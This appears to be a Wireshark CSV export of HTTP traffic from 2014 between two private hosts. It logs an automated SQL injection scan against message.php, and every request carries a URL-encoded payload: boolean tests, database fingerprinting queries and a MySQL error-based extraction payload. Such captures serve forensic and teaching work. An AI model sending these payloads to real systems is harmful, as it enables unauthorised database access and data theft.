"No.","Time","Source","Destination","Protocol","Length","Info"
"4","2014-09-03 15:02:24.914924","10.0.0.101","10.0.0.201","HTTP","423","GET /message.php?id=1 HTTP/1.1 "
"6","2014-09-03 15:02:24.917025","10.0.0.201","10.0.0.101","HTTP","308","HTTP/1.1 200 OK  (text/html)"
"14","2014-09-03 15:02:25.963526","10.0.0.101","10.0.0.201","HTTP","423","GET /message.php?id=1 HTTP/1.1 "
"16","2014-09-03 15:02:25.964806","10.0.0.201","10.0.0.101","HTTP","308","HTTP/1.1 200 OK  (text/html)"
"24","2014-09-03 15:02:26.002101","10.0.0.101","10.0.0.201","HTTP","426","GET /message.php?id=2586 HTTP/1.1 "
"26","2014-09-03 15:02:26.003579","10.0.0.201","10.0.0.101","HTTP","268","HTTP/1.1 200 OK  (text/html)"
"34","2014-09-03 15:02:26.014294","10.0.0.101","10.0.0.201","HTTP","426","GET /message.php?id=7992 HTTP/1.1 "
"36","2014-09-03 15:02:26.015437","10.0.0.201","10.0.0.101","HTTP","268","HTTP/1.1 200 OK  (text/html)"
"44","2014-09-03 15:02:26.018867","10.0.0.101","10.0.0.201","HTTP","447","GET /message.php?id=1%2C%2C.%27..%29%5D%22%5D HTTP/1.1 "
"46","2014-09-03 15:02:26.020115","10.0.0.201","10.0.0.101","HTTP","275","HTTP/1.1 200 OK  (text/html)"
"54","2014-09-03 15:02:26.023859","10.0.0.101","10.0.0.201","HTTP","431","GET /message.php?id=5432-5431 HTTP/1.1 "
"56","2014-09-03 15:02:26.025068","10.0.0.201","10.0.0.101","HTTP","316","HTTP/1.1 200 OK  (text/html)"
"64","2014-09-03 15:02:26.072812","10.0.0.101","10.0.0.201","HTTP","469","GET /message.php?id=1%29%20AND%203700%3D5811%20AND%20%288309%3D8309 HTTP/1.1 "
"66","2014-09-03 15:02:26.074012","10.0.0.201","10.0.0.101","HTTP","295","HTTP/1.1 200 OK  (text/html)"
"74","2014-09-03 15:02:26.077104","10.0.0.101","10.0.0.201","HTTP","469","GET /message.php?id=1%29%20AND%201922%3D1922%20AND%20%288362%3D8362 HTTP/1.1 "
"76","2014-09-03 15:02:26.078150","10.0.0.201","10.0.0.101","HTTP","295","HTTP/1.1 200 OK  (text/html)"
"84","2014-09-03 15:02:26.082453","10.0.0.101","10.0.0.201","HTTP","443","GET /message.php?id=1%20AND%205345%3D8796 HTTP/1.1 "
"86","2014-09-03 15:02:26.083672","10.0.0.201","10.0.0.101","HTTP","279","HTTP/1.1 200 OK  (text/html)"
"94","2014-09-03 15:02:26.086617","10.0.0.101","10.0.0.201","HTTP","443","GET /message.php?id=1%20AND%201922%3D1922 HTTP/1.1 "
"96","2014-09-03 15:02:26.088285","10.0.0.201","10.0.0.101","HTTP","385","HTTP/1.1 200 OK  (text/html)"
"104","2014-09-03 15:02:26.095820","10.0.0.101","10.0.0.201","HTTP","443","GET /message.php?id=1%20AND%204619%3D3526 HTTP/1.1 "
"106","2014-09-03 15:02:26.097047","10.0.0.201","10.0.0.101","HTTP","279","HTTP/1.1 200 OK  (text/html)"
"114","2014-09-03 15:02:26.107422","10.0.0.101","10.0.0.201","HTTP","587","GET /message.php?id=1%20AND%20%28SELECT%20CHR%28118%29%26CHR%28100%29%26CHR%2880%29%26CHR%2875%29%20FROM%20MSysAccessObjects%29%3DCHR%28118%29%26CHR%28100%29%26CHR%2880%29%26CHR%2875%29 HTTP/1.1 "
"116","2014-09-03 15:02:26.109041","10.0.0.201","10.0.0.101","HTTP","391","HTTP/1.1 200 OK  (text/html)"
"124","2014-09-03 15:02:26.121956","10.0.0.101","10.0.0.201","HTTP","604","GET /message.php?id=1%20AND%20%28SELECT%20CHR%28118%29%7C%7CCHR%28100%29%7C%7CCHR%2880%29%7C%7CCHR%2875%29%20FROM%20SYSIBM.SYSDUMMY1%29%3DCHR%28118%29%7C%7CCHR%28100%29%7C%7CCHR%2880%29%7C%7CCHR%2875%29 HTTP/1.1 "
"126","2014-09-03 15:02:26.123406","10.0.0.201","10.0.0.101","HTTP","391","HTTP/1.1 200 OK  (text/html)"
"134","2014-09-03 15:02:26.136291","10.0.0.101","10.0.0.201","HTTP","494","GET /message.php?id=1%20AND%20%28SELECT%20%27vdPK%27%20FROM%20RDB%24DATABASE%29%3D%27vdPK%27 HTTP/1.1 "
"136","2014-09-03 15:02:26.137497","10.0.0.201","10.0.0.101","HTTP","310","HTTP/1.1 200 OK  (text/html)"
"144","2014-09-03 15:02:26.153407","10.0.0.101","10.0.0.201","HTTP","627","GET /message.php?id=1%20AND%20%28SELECT%20CHAR%28118%29%7C%7CCHAR%28100%29%7C%7CCHAR%2880%29%7C%7CCHAR%2875%29%20FROM%20INFORMATION_SCHEMA.SYSTEM_USERS%29%3DCHAR%28118%29%7C%7CCHAR%28100%29%7C%7CCHAR%2880%29%7C%7CCHAR%2875%29 HTTP/1.1 "
"146","2014-09-03 15:02:26.154766","10.0.0.201","10.0.0.101","HTTP","409","HTTP/1.1 200 OK  (text/html)"
"154","2014-09-03 15:02:26.167385","10.0.0.101","10.0.0.201","HTTP","488","GET /message.php?id=1%20AND%20%28SELECT%20%27vdPK%27%20FROM%20VERSIONS%29%3D%27vdPK%27 HTTP/1.1 "
"156","2014-09-03 15:02:26.168554","10.0.0.201","10.0.0.101","HTTP","306","HTTP/1.1 200 OK  (text/html)"
"164","2014-09-03 15:02:26.181349","10.0.0.101","10.0.0.201","HTTP","568","GET /message.php?id=1%20AND%20%28SELECT%20CHAR%28118%29%2BCHAR%28100%29%2BCHAR%2880%29%2BCHAR%2875%29%29%3DCHAR%28118%29%2BCHAR%28100%29%2BCHAR%2880%29%2BCHAR%2875%29 HTTP/1.1 "
"166","2014-09-03 15:02:26.182631","10.0.0.201","10.0.0.101","HTTP","413","HTTP/1.1 200 OK  (text/html)"
"174","2014-09-03 15:02:26.195506","10.0.0.101","10.0.0.201","HTTP","568","GET /message.php?id=1%20AND%20%28SELECT%20CHAR%28118%29%2BCHAR%28100%29%2BCHAR%2880%29%2BCHAR%2875%29%29%3DCHAR%2874%29%2BCHAR%28103%29%2BCHAR%28103%29%2BCHAR%2881%29 HTTP/1.1 "
"176","2014-09-03 15:02:26.196900","10.0.0.201","10.0.0.101","HTTP","421","HTTP/1.1 200 OK  (text/html)"
"184","2014-09-03 15:02:26.209713","10.0.0.101","10.0.0.201","HTTP","470","GET /message.php?id=1%20AND%20%28SELECT%200x7664504b%29%3D0x7664504b HTTP/1.1 "
"186","2014-09-03 15:02:26.211225","10.0.0.201","10.0.0.101","HTTP","401","HTTP/1.1 200 OK  (text/html)"
"194","2014-09-03 15:02:26.223942","10.0.0.101","10.0.0.201","HTTP","470","GET /message.php?id=1%20AND%20%28SELECT%200x7664504b%29%3D0x4a676751 HTTP/1.1 "
"196","2014-09-03 15:02:26.225200","10.0.0.201","10.0.0.101","HTTP","300","HTTP/1.1 200 OK  (text/html)"
"204","2014-09-03 15:02:26.239866","10.0.0.101","10.0.0.201","HTTP","703","GET /message.php?id=1%20AND%20%28SELECT%201926%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7173636371%2C%28SELECT%20%28CASE%20WHEN%20%281926%3D1926%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716f757371%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1 "
"206","2014-09-03 15:02:26.242048","10.0.0.201","10.0.0.101","HTTP","482","HTTP/1.1 200 OK  (text/html)"
